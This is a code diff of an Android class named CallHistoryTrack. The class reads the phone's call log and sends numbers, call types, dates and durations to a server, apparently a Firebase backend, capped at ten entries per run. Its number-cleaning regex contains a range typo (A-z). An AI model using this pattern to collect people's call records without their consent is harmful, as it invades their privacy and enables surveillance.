@@ -12,6 +12,8 @@ import com.google.firebase.database.FirebaseDatabase;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 
+import contact.ContactModel;
+
 public class CallHistoryTrack {
 
     private static final String TAG = "11";
@@ -34,7 +36,7 @@ public class CallHistoryTrack {
 
         Log.i(TAG, "Sending CallLog to Server started");
         // reading all data in descending order according to DATE
-        String sortOrder = android.provider.CallLog.Calls.DATE + " DESC";
+        String sortOrder = CallLog.Calls.DEFAULT_SORT_ORDER; //+ " DESC";
         int callCounter = 0;
         String time , date ;
 
@@ -56,6 +58,14 @@ public class CallHistoryTrack {
             callType = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
             callDate = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
             callDuration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
+
+
+
+            callNumber =  callNumber.replaceAll("[^a-zA-z0-9]", "");
+
+
+
+
 
             time = callDate;
             date = callDate;
@@ -102,7 +112,7 @@ public class CallHistoryTrack {
 
             SendDataToServer(callLogItem);
 
-            if(callCounter == 30)
+            if(callCounter == 10)
                 break;
         }
     }
